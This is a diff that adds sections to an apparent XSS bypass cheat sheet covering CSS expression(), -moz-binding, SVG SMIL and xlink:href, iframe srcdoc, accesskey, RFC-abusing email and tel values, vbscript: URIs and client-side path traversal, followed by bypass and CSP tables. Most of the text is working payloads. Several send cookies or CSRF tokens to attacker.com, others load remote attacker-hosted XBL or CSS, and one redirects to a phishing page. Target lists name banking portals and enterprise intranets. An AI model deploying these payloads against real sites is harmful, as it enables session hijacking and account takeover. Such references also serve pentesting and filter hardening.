@@ -2224,3 +2224,413 @@ document.body.appendChild(tmpl.content.cloneNode(true)); // XSS fires on append
 | `require-trusted-types-for 'script'` + prototype pollution | `createHTML` method on prototype → all policies bypass validation | PP `Object.prototype.createHTML = s => s` → TT check passes raw string |
 | `default-src 'self'` without `frame-src` | Iframe to same-origin resource → contentWindow script append | `<iframe src=/x onload="this.contentWindow.document.write('<script src=//evil.com/x.js><\/script>')">` |
 | Any CSP on page with Shadow DOM components | Sanitizer doesn't traverse open shadow roots | Inject into `shadowRoot.innerHTML` from page JS after achieving DOM write access |
+## CSS expression() / -moz-binding — Legacy CSS Execution
+
+**Type:** stored / reflected
+**Filter bypassed:** Sanitizers and WAF rules focused on HTML tag/event-handler injection that allow `<style>` blocks or inline `style=` attributes; CSP without `style-src` restriction
+**Bypass logic:** Two legacy CSS execution primitives: (1) IE's `expression()` — a Microsoft CSS extension that evaluates a JavaScript expression as a property value, re-evaluated on every repaint. Works in IE 6–9, still found in enterprise intranets. (2) Firefox's `-moz-binding` — loads an XML Bindings Language (XBL) file from a URL and attaches event handlers / JavaScript to matching elements, equivalent to remote JS execution. Both are absent from modern browser security models but remain viable against legacy corporate targets. Many WAFs and sanitizers allow `style` attributes without checking for these expressions.
+**Attack chain:** CSS injection via style attribute/block → expression()/moz-binding fires → arbitrary JS execution → cookie theft → ATO
+
+**Payload:**
+```html
+<!-- IE expression() — re-fires on every CSS recalculation -->
+<div style="xss:expression(alert(document.cookie))">IE XSS</div>
+<img style="xss:expression(alert(1))">
+<body style="width:expression(alert(1))">
+
+<!-- Harder-to-filter variants (obfuscating the word "expression") -->
+<div style="x:expres/**/sion(alert(1))">
+<div style="x:exp\65ression(alert(1))">      <!-- \65 = e in CSS escaping -->
+<div style="xss:&#101;xpression(alert(1))">  <!-- HTML entity for 'e' -->
+
+<!-- Firefox -moz-binding (Firefox < 3, still in some legacy deployments) -->
+<!-- Step 1: Host XBL file at attacker.com/xss.xml: -->
+<!--   <?xml version="1.0"?>                                          -->
+<!--   <bindings xmlns="http://www.mozilla.org/xbl"                  -->
+<!--     xmlns:html="http://www.w3.org/1999/xhtml">                  -->
+<!--     <binding id="xss">                                           -->
+<!--       <implementation><constructor>alert(1)</constructor></implementation> -->
+<!--     </binding>                                                   -->
+<!--   </bindings>                                                    -->
+<!-- Step 2: Inject via style: -->
+<div style="-moz-binding:url(https://attacker.com/xss.xml#xss)">moz</div>
+
+<!-- Modern -moz-binding variant (data: URI, no hosting needed) -->
+<div style="-moz-binding:url(data:text/xml;charset=utf-8,%3C%3Fxml...)">
+
+<!-- CSS import with expression (in @import context) -->
+<style>@import 'javascript:alert(1)'</style>   <!-- Some old browsers evaluate this -->
+
+<!-- Via link element if style-src is missing from CSP -->
+<link rel="stylesheet" href="https://attacker.com/evil.css">
+<!-- evil.css contains: body { xss: expression(fetch('//attacker.com/?c='+document.cookie)) } -->
+```
+
+**Where to test:**
+```
+- Enterprise intranets, banking portals, legacy government sites (IE11 still in use)
+- Any endpoint that echoes content into <style> blocks or style= attributes
+- WAF/sanitizer bypasses when style injection is allowed
+- Scope: "internal tools", "legacy portal", "enterprise app" → high IE probability
+```
+
+**Source:** https://owasp.org/www-community/attacks/xss/; https://developer.mozilla.org/en-US/docs/Web/CSS/-moz-binding
+
+---
+
+## Client-Side Path Traversal → XSS
+
+**Type:** DOM / reflected
+**Filter bypassed:** Server-side path validation (never sees the traversal — it happens client-side in JS routing); WAF rules focused on query parameters, missing path-based traversal patterns
+**Bypass logic:** In SPAs with client-side routing, JavaScript reads `location.pathname` and routes to components or fetches resources based on it. When a path segment from the URL is used in a `fetch()`, `import()`, or `<script src>` construction without sanitization, path traversal sequences (`../`, `%2F`) can redirect the fetch to a different endpoint. Unlike server-side path traversal, the server returns 200 for the SPA's index.html on all routes — but the client-side fetch target is controlled by the attacker. This technique was documented by PortSwigger in 2023 and leads to content spoofing, CSRF, or stored XSS via API response injection.
+**Attack chain:** Craft URL with `/../` traversal in path → SPA router processes pathname → JS constructs `fetch('/api/' + pathname)` → traversal reaches unexpected endpoint → response injected into DOM → XSS
+
+**Payload:**
+```javascript
+// Vulnerable SPA routing pattern:
+// App: fetch('/api/users/' + location.pathname.split('/')[2])
+// Normal URL: /app/profile → fetches /api/users/profile
+// Attack URL: /app/../../admin/config → fetches /api/users/../../admin/config → /admin/config
+
+// Step 1: Find where SPA reads location.pathname and uses it in a fetch/src
+// DevTools → Sources → Search for: location.pathname, window.location.path, router.params
+
+// Step 2: Test path traversal
+// Normal: https://target.com/app/users/alice
+// Traversal: https://target.com/app/users/%2F..%2F..%2Fadmin
+
+// Step 3: If fetch response lands in innerHTML or eval → XSS
+// Attack URL that injects into template:
+https://target.com/app/..%2F..%2Fattacker-controlled-endpoint
+
+// If app does: element.innerHTML = await fetch('/data/' + routeParam).then(r=>r.text())
+// And attacker controls a same-origin endpoint response (e.g., error messages, search results)
+// → response contains XSS payload → innerHTML sink → fires
+
+// Encoded variants (bypass naive path filters):
+/../         // standard
+/..%2F       // URL-encoded slash
+/..%252F     // double-encoded
+/%2e%2e/     // encoded dots
+/%2e%2e%2f   // combined
+
+// Real-world chain (CSRF → Stored XSS):
+// 1. Find CSRF endpoint via path traversal: /app/../../api/admin/users
+// 2. POST malicious data to admin endpoint
+// 3. Admin panel renders stored XSS payload
+```
+
+**Detection steps:**
+```
+1. Map all SPA route parameters that appear in fetch() URLs (grep for location.pathname, $route.params, useParams())
+2. Replace route param with ../../ sequences
+3. Check Network tab: does the fetch target change?
+4. If response is inserted into DOM → check for XSS
+5. Also test: React Router, Vue Router, Angular Router wildcard routes
+```
+
+**Source:** https://portswigger.net/research/client-side-path-traversal ; https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses
+
+---
+
+## SVG SMIL Animation Event Handlers
+
+**Type:** stored / reflected
+**Filter bypassed:** WAF rules and sanitizers that block `on*=` event handlers on standard HTML elements but do not strip SMIL-specific animation events; `<animate>` / `<animateTransform>` tags absent from many sanitizer blocklists
+**Bypass logic:** SVG supports Synchronized Multimedia Integration Language (SMIL) animations via `<animate>`, `<animateTransform>`, `<animateMotion>`, and `<set>` elements. These elements have their own event handlers (`onbegin`, `onend`, `onrepeat`, `onload`) that fire automatically when the SVG animation starts — requiring **zero user interaction**. Most WAF event-handler blocklists focus on `onclick`, `onload` on HTML elements, `onerror`, etc., and do not include SMIL-specific events. DOMPurify explicitly blocklists these but many commercial WAFs do not.
+**Attack chain:** Stored SVG upload or inline SVG injection → SMIL animation begins automatically on render → `onbegin` fires → JS executes → cookie exfil → ATO
+
+**Payload:**
+```html
+<!-- Fires immediately when SVG renders (zero interaction) -->
+<svg xmlns="http://www.w3.org/2000/svg">
+  <animate onbegin="alert(document.cookie)" attributeName="x" dur="1s"/>
+</svg>
+
+<!-- animateTransform variant -->
+<svg>
+  <animateTransform onbegin="alert(1)" attributeName="transform" dur="1s"/>
+</svg>
+
+<!-- set element variant -->
+<svg>
+  <set onbegin="alert(document.domain)" attributeName="x" to="1"/>
+</svg>
+
+<!-- animateMotion variant -->
+<svg>
+  <animateMotion onbegin="alert(1)" dur="0.1s"/>
+</svg>
+
+<!-- onend fires after animation completes -->
+<svg>
+  <animate onend="alert(1)" attributeName="x" from="0" to="1" dur="0.01s"/>
+</svg>
+
+<!-- With exfil payload (no alerts in real PoCs) -->
+<svg>
+  <animate onbegin="fetch('https://attacker.com/x?c='+btoa(document.cookie))"
+           attributeName="x" dur="0.01s"/>
+</svg>
+
+<!-- Minimal inline form (bypasses length limits) -->
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+```
+
+**Bypass note:** DOMPurify strips these by default. Effective against: custom sanitizers, commercial WAFs (Akamai/Cloudflare rules tuned for HTML events), server-side allow-list filters that permit `<svg>` but not the full event vocabulary.
+
+**Source:** https://www.w3.org/TR/SMIL3/ ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Hidden Input AccessKey XSS
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF rules requiring user-interaction-visible elements; sanitizers that allow `<input type="hidden">` tags (since hidden inputs appear harmless); automated scanners that don't simulate keyboard shortcuts
+**Bypass logic:** The HTML `accesskey` attribute allows a keyboard shortcut to "activate" any element. For hidden inputs, activation triggers `onclick`. The shortcut `Alt+SHIFT+[key]` (Firefox/Linux), `Alt+[key]` (IE/Edge), or `Ctrl+Alt+[key]` (Mac) fires the event. In social engineering phishing contexts, an attacker can instruct the victim to press a specific key combination. More practically: some screen readers and automation frameworks trigger accesskey actions automatically, making this viable in accessibility-driven ATO attacks. WAFs allowing `type="hidden"` inputs rarely inspect the `accesskey` attribute for XSS.
+**Attack chain:** Hidden input with accesskey injected → victim (or automation) presses shortcut key → onclick fires → JS executes → session theft → ATO
+
+**Payload:**
+```html
+<!-- Basic: hidden input fires onclick on Ctrl+Shift+X (varies by browser/OS) -->
+<input type="hidden" accesskey="X" onclick="alert(document.cookie)">
+
+<!-- With full cookie exfil -->
+<input type="hidden" accesskey="q"
+  onclick="fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))">
+
+<!-- Text input (still hidden visually via CSS) -->
+<input type="text" accesskey="x" onclick="alert(1)"
+  style="position:absolute;left:-9999px">
+
+<!-- Works on non-input elements too -->
+<a href="#" accesskey="x" onclick="alert(1)" style="display:none">x</a>
+
+<!-- Modifier key shortcuts by browser:
+     Firefox on Linux:   Alt+Shift+[key]
+     IE/Edge:            Alt+[key]
+     Chrome/Safari Mac:  Ctrl+Option+[key]
+     Chrome Linux:       Alt+[key]                      -->
+
+<!-- Social engineering variant (instruction-based): -->
+<!-- "Press Alt+A for our site to work correctly" -->
+<input type="hidden" accesskey="a"
+  onclick="document.location='https://phishing.com/fake-login'">
+```
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection ; https://portswigger.net/research/xss-in-hidden-input-fields
+
+---
+
+## iframe srcdoc XSS
+
+**Type:** reflected / stored
+**Filter bypassed:** `frame-src data:` CSP restrictions (srcdoc is treated as same-origin, not a data: URI); WAFs that block `<iframe src="javascript:...">` but permit the `srcdoc` attribute
+**Bypass logic:** The `srcdoc` attribute renders HTML inline inside an iframe as if it were the iframe's document. Unlike `src="data:text/html,..."` (blocked by most CSPs' `frame-src` directives), `srcdoc` content is treated as same-origin and inherits the parent page's origin — meaning it can access `document.cookie`, `localStorage`, and parent DOM. A sanitizer that strips `javascript:` and `data:` URIs from iframe `src` but allows `srcdoc` entirely passes this vector.
+**Attack chain:** `<iframe srcdoc>` injection → executes in parent-domain context → `document.cookie` / `parent.document` accessible → full session theft → ATO
+
+**Payload:**
+```html
+<!-- Basic execution: srcdoc HTML renders in same-origin iframe -->
+<iframe srcdoc="<script>alert(document.cookie)</script>"></iframe>
+
+<!-- When angle brackets are HTML-entity encoded in srcdoc attribute -->
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+
+<!-- With cookie exfil (same-origin — no CORS issues) -->
+<iframe srcdoc="<script>
+  parent.fetch('https://attacker.com/steal?c='+
+    encodeURIComponent(document.cookie))
+</script>"></iframe>
+
+<!-- Access parent DOM from srcdoc frame -->
+<iframe srcdoc="<script>
+  var tok = parent.document.querySelector('input[name=csrf_token]').value;
+  fetch('https://attacker.com/steal?t=' + tok);
+</script>"></iframe>
+
+<!-- Bypass sandbox="allow-scripts" restriction (still same-origin): -->
+<iframe sandbox="allow-scripts" srcdoc="<script>alert(1)</script>"></iframe>
+<!-- Note: with sandbox, document.cookie is accessible but parent DOM access requires
+     allow-same-origin — without it, cookie is still readable from the sandboxed context -->
+
+<!-- Short payload for length-limited contexts -->
+<iframe srcdoc="<img src=x onerror=alert(1)>">
+```
+
+**CSP note:** `Content-Security-Policy: frame-src 'self'` allows `srcdoc` frames since they inherit origin. `frame-src 'none'` blocks all frames including srcdoc.
+
+**Source:** https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-srcdoc ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Email / Tel Input RFC Abuse XSS
+
+**Type:** reflected / stored
+**Filter bypassed:** Server-side and client-side email/phone format validators that follow RFC822/RFC3966 strictly — RFC complexity creates edge cases where XSS payloads pass validation
+**Bypass logic:** RFC822 email addresses allow quoted strings and comments in complex formats. Parsers implementing full RFC822 (rather than a simple regex) may accept `"><svg/onload=confirm(1)>"@x.y` as a technically valid quoted local-part. Similarly, RFC3966 `tel:` URIs allow a `phone-context` parameter that accepts arbitrary strings — enabling injection of HTML/JS after the phone number in contexts that render tel: links. Both bypass `input type=email` / `input type=tel` HTML5 validation since browser validators use simplified forms of these RFCs.
+**Attack chain:** RFC-valid payload in email/tel field → passes validation → stored/reflected in HTML context → XSS fires → ATO
+
+**Payload:**
+```html
+<!-- Email context: quoted local-part RFC822 injection -->
+"><svg/onload=confirm(1)>"@x.y
+
+<!-- With exfil -->
+"><img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"@x.y
+
+<!-- Variation: comment in email (RFC822 allows comments in parentheses) -->
+user(comment<script>alert(1)</script>)@example.com
+
+<!-- Tel RFC3966 phone-context injection -->
++330011223344;phone-context=<script>alert(1)</script>
+
+<!-- Tel URI with descriptive text containing XSS -->
+tel:+1234567890;name="><svg/onload=alert(1)>
+
+<!-- In mailto: href context -->
+<a href="mailto:"><svg/onload=alert(1)>"@x.y">click</a>
+
+<!-- Testing steps:
+     1. Find email input fields that reflect value in HTML (confirmation page, profile)
+     2. Submit RFC-complex addresses
+     3. Check if output is reflected unescaped (e.g., "Welcome, <email>!")
+     4. Chain: profile email displayed in admin → stored XSS in admin panel -->
+```
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection ; RFC822 §6.1, RFC3966 §5
+
+---
+
+## SVG xlink:href / href Injection
+
+**Type:** stored / reflected
+**Filter bypassed:** WAF rules blocking `javascript:` in `href`/`src` that miss SVG-specific `xlink:href` attribute; sanitizers that allowlist SVG elements without blocking their namespace attributes
+**Bypass logic:** SVG elements support the XLink namespace attribute `xlink:href` (and the newer plain `href`) for referencing external or internal resources. On `<a>`, `<use>`, and `<image>` elements this acts like `href` in HTML — including support for `javascript:` URIs. Since `xlink:href` is a qualified attribute name (namespace prefix + local name), WAF string-matching on `href=` may not catch `xlink:href=`. Additionally, `<use href="data:image/svg+xml,...#xss">` can load and instantiate an SVG from a data URI, executing scripts embedded in the referenced element.
+**Attack chain:** SVG injection with xlink:href pointing to `javascript:` or malicious SVG data URI → click or load event → arbitrary JS → cookie theft → ATO
+
+**Payload:**
+```html
+<!-- SVG anchor with xlink:href = javascript: URI -->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <a xlink:href="javascript:alert(document.cookie)">
+    <text x="20" y="20">click me</text>
+  </a>
+</svg>
+
+<!-- Short form using newer href (no namespace needed in HTML5 SVG) -->
+<svg><a href="javascript:alert(1)"><text>click</text></a></svg>
+
+<!-- SVG use element referencing data URI with embedded script -->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <use xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4jeHNz"/>
+</svg>
+<!-- base64 = <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>#xss -->
+
+<!-- SVG image element loading external SVG (same-origin SSRF / XSS chain) -->
+<svg>
+  <image xlink:href="https://target.com/upload/attacker.svg"/>
+</svg>
+
+<!-- Filter bypass: attribute name variations -->
+xlink:href="javascript:alert(1)"
+XLINK:HREF="javascript:alert(1)"
+xmlns:xlink in SVG root, xlink:href on child
+
+<!-- Practical attack flow:
+     1. Find SVG upload / SVG inline injection point
+     2. Inject xlink:href="javascript:alert(1)" on <a> or <use>
+     3. If user clicks (social engineering) or onload fires → XSS
+     4. Combined with SMIL onbegin → no user interaction needed -->
+```
+
+**Source:** https://www.w3.org/TR/SVG11/linking.html#XLinkHrefAttribute ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## VBScript Protocol XSS (IE / Legacy Browser)
+
+**Type:** reflected / stored / DOM
+**Filter bypassed:** Filters blocking `javascript:` URI scheme while not blocking `vbscript:` — completely absent from most modern WAF rulesets because mainstream browsers dropped VBScript support in the 2000s
+**Bypass logic:** Internet Explorer supported `vbscript:` as a URI scheme that executes VBScript — Microsoft's alternative to JavaScript. IE 11 (still used in enterprise environments, embedded kiosks, and some legacy government systems) supports both. A `vbscript:` URI in `href`, `src`, or `action` attributes triggers VBScript execution. Since WAF rules focus on `javascript:`, `vbscript:` often passes completely unfiltered. The payload must be VBScript syntax rather than JS, but basic XSS PoCs (`msgbox`, `document.cookie` access) are straightforward.
+**Attack chain:** href/src injection with vbscript: URI → bypasses javascript:-focused filter → IE executes VBScript → window.location / document.cookie access → session theft
+
+**Payload:**
+```html
+<!-- Basic execution: msgbox = VBScript alert() -->
+<a href="vbscript:msgbox('XSS')">click me</a>
+
+<!-- Access document.cookie in VBScript -->
+<a href="vbscript:msgbox(document.cookie)">steal cookies</a>
+
+<!-- Navigate to attacker site with cookies in URL -->
+<a href="vbscript:document.location='https://attacker.com/?c='+document.cookie">go</a>
+
+<!-- img onerror variant -->
+<img src=x onerror="document.location='vbscript:msgbox(1)'">
+
+<!-- In iframe src -->
+<iframe src="vbscript:document.write('<script>alert(1)</'+'script>')"></iframe>
+
+<!-- Encoded variants -->
+<a href="vbscript&#58;msgbox(1)">click</a>     <!-- HTML entity for : -->
+<a href="&#118;&#98;&#115;&#99;&#114;&#105;&#112;&#116;&#58;msgbox(1)">click</a>  <!-- full encoding -->
+
+<!-- Combined IE-only: VBScript exfil via XmlHttp -->
+<a href="vbscript:
+  Set x = CreateObject('MSXML2.XMLHTTP')
+  x.open 'GET','https://attacker.com/?c='+document.cookie,False
+  x.send
+">exfil</a>
+
+<!-- Where to test:
+     - Enterprise intranets (SharePoint, Oracle E-Business, SAP Fiori on IE11)
+     - Kiosk systems, ATM interfaces
+     - Legacy banking portals
+     - Any scope mentioning "IE11 compatible" or "Windows 7" -->
+```
+
+**Source:** https://learn.microsoft.com/en-us/previous-versions/ms533050(v=vs.85) ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Bypass Matrix (Updated 2026-06-01)
+
+### New Entries — Techniques Added 2026-06-01
+
+| Filter / Defense | Bypass Technique | Payload Example |
+|-----------------|------------------|-----------------|
+| `require-trusted-types-for 'script'` | Permissive policy passthrough | `trustedTypes.getPolicy('escape').createHTML('<img src=x onerror=alert(1)>')` |
+| Trusted Types + prototype pollution | Overwrite `toString` on TrustedHTML prototype | `Object.prototype.toString = function(){return '[object TrustedHTML]'}` |
+| Sanitizer checks `document.body.innerHTML` only | Shadow DOM open-mode injection | `host.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>'` |
+| `style=` / `<style>` allowed, JS blocked | CSS `expression()` (IE6-9) | `<div style="xss:expression(alert(1))">` |
+| `style=` allowed (Firefox legacy) | `-moz-binding` remote XBL execution | `<div style="-moz-binding:url(https://attacker.com/xss.xml#xss)">` |
+| Server validates path, SPA uses pathname in fetch | Client-side path traversal | `/app/../../admin` → SPA fetches `/admin` → response injected into DOM |
+| WAF blocks HTML element `on*=` events | SVG SMIL `onbegin` / `onend` | `<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"/>` |
+| WAF allows `<input type="hidden">` | AccessKey keyboard shortcut XSS | `<input type="hidden" accesskey="X" onclick="alert(1)">` |
+| `frame-src data:` blocked | `srcdoc` same-origin iframe | `<iframe srcdoc="<script>alert(document.cookie)</script>">` |
+| Email/tel input validation | RFC822/3966 complex local-part injection | `"><svg/onload=confirm(1)>"@x.y` |
+| `href=` pattern match (misses `xlink:href`) | SVG xlink:href javascript: URI | `<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>` |
+| `javascript:` scheme blocked | `vbscript:` scheme (IE11 / legacy) | `<a href="vbscript:msgbox(document.cookie)">` |
+
+### New Sinks Documented 2026-06-01
+
+| Sink | Context | Notes |
+|------|---------|-------|
+| Shadow DOM `.innerHTML` (via `shadowRoot`) | DOM / Web Components | Open mode shadow roots accessible from parent JS; sanitizer misses content |
+| CSS `expression()` property value | IE6-9 style attribute | Re-evaluates on repaint; any style attribute that includes user input |
+| `-moz-binding` CSS property | Firefox < 3 / legacy | Loads remote XBL file; executes JS in `<constructor>` element |
+| `<animate onbegin>` / `<animateTransform onbegin>` | SVG SMIL | Fires on animation start; zero user interaction; often missed by WAFs |
+| `<iframe srcdoc>` | All modern browsers | Same-origin iframe renders HTML inline; inherits parent cookies/DOM |
+| `<a xlink:href="javascript:">` | SVG namespace | `xlink:href` not matched by `href=` WAF rules |
+| `trustedTypes.createPolicy('default',...)` passthrough | Trusted Types | Default policy called for all bare strings; if permissive → TT fully bypassed |
+
+### CSP Configurations — New Weaknesses (2026-06-01)
+
+| CSP Configuration | Weakness | Bypass |
+|------------------|----------|--------|
+| `require-trusted-types-for 'script'` + permissive policy | Policy performs no sanitization | Inject payload into `createHTML(s => s)` passthrough policy |
+| `require-trusted-types-for 'script'` + prototype pollution | PP overwrites TT type-check | Pollute `Object.prototype.toString` → arbitrary strings accepted as TrustedHTML |
+| `frame-src 'self'` (missing `'none'`) | `srcdoc` not blocked by frame-src | `<iframe srcdoc>` creates same-origin iframe with full DOM/cookie access |
+| No `style-src` directive | CSS `expression()` / `-moz-binding` executes | `style="xss:expression(alert(1))"` fires on IE; `-moz-binding` on legacy Firefox |
+
